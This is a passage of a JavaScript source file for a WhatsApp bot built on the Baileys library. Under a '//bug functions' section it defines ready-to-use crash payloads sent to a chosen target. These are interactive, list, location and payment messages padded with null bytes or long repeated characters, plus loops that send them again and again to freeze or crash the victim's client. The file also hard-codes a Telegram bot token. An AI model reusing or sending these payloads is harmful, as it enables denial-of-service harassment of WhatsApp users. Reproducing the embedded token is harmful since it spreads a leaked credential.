//base by Limule Solitarus 
//re-upload? recode? copy code? give credit ya :)
//YouTube: @Darklimule
//Instagram: mikael_jordan
//Telegram: t.me/darklimule
//GitHub: @Limule3650
//WhatsApp: +237693538738
//want more free bot scripts? subscribe to my youtube channel: https://www.youtube.com/@Darklimule

const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const NodeCache = require('node-cache');

//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const { xeontext11 } = require('./69/xeontext11')
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))
const AudioXeon = JSON.parse(fs.readFileSync('./database/autoreply/audio.json'))

//time
const xtime = moment.tz('Africa/Yaounde').format('HH:mm:ss')
        const xdate = moment.tz('Africa/Yaounde').format('DD/MM/YYYY')
        const time2 = moment().tz('Africa/Yaounde').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `𝑮𝒖𝒕𝒆𝒏 𝑵𝒂𝒕𝒄𝒉 𝒃𝒂𝒃𝒚 💓 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `𝑮𝒐𝒐𝒅 𝑬𝒗𝒆𝒏𝒊𝒏𝒈 𝒃𝒂𝒃𝒆😍 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `𝑮𝒐𝒐𝒅 𝑬𝒗𝒆𝒏𝒊𝒏𝒈 𝒃𝒂𝒃𝒆😍 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `𝑮𝒐𝒐𝒅 𝑨𝒇𝒕𝒆𝒓𝒏𝒐𝒐𝒏 𝒃𝒂𝒃𝒆💞 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `𝑮𝒐𝒐𝒅 𝑴𝒐𝒓𝒏𝒊𝒏𝒈 𝒃𝒂𝒃𝒆💋 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `𝑮𝒐𝒐𝒅 𝑴𝒐𝒓𝒏𝒊𝒏𝒈 𝒃𝒂𝒃𝒆💋 🌄`
 } 
module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId : (m.mtype == 'templateButtonreplygcxeonMessage') ? m.message.templateButtonreplygcxeonMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcxeon.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = XeonBotInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || XeonBotInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(XeonBotInc, m, premium);
//group chat msg by xeon
const replygcxeon = (teks) => {
XeonBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcxeon('𝑴𝒚 𝒉𝒆𝒂𝒓𝒕🍭 𝒑𝒍𝒆𝒂𝒔𝒆 𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝒖𝒓𝒍 𝒕𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝒔𝒕𝒊𝒄𝒌𝒆𝒓 𝒍𝒊𝒏𝒌 ☺️')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'Limule Solitarus',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}

//bug functions
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./69/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./69/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🐉 Limule Solitarus`
}
}
}
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🐉Limule Solitarus",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://iili.io/dP0QBOF.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🐉Limule Solitarus"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🐉Limule Solitarus"+" ".repeat(920000),
        'footerText': `🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus`,
        'description': `🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const sendReaction = async reactionContent => {
  XeonBotInc.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   XeonBotInc.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    XeonBotInc.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_SHUNA"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  XeonBotInc.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  XeonBotInc.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const xeonimun = (texto) => {
XeonBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Limule's your master`
}}
}
async function XeonyCrashy(dgxeon,chat) {
XeonBotInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgxeon}.${xeontext1}` ,
caption: `${dgxeon + xeontext1}`,
}, {quoted: subscribe_dgxeon })
}
//end bug functions

async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🐉..."
]
let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!XeonBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            XeonBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        XeonBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        XeonBotInc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        XeonBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        XeonBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            XeonBotInc.updateProfileStatus(`𝑲𝒂𝒘𝒂𝒊🍭 𝑺𝒉𝒖𝒏𝒂-𝑩𝒖𝒈❤️ 24/7 𝑷𝒓𝒆𝒔𝒆𝒏𝒕 𝒂𝒏𝒅 𝑶𝒏𝒍𝒊𝒏𝒆 𝒃𝒚 𝑴𝒂𝒔𝒕𝒆𝒓 𝑳𝒊𝒎𝒖𝒍𝒆 𝒂𝒏𝒅 𝒄𝒐𝒏𝒏𝒆𝒄𝒕𝒆𝒅 𝒐𝒏 ${ownername} ☺`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
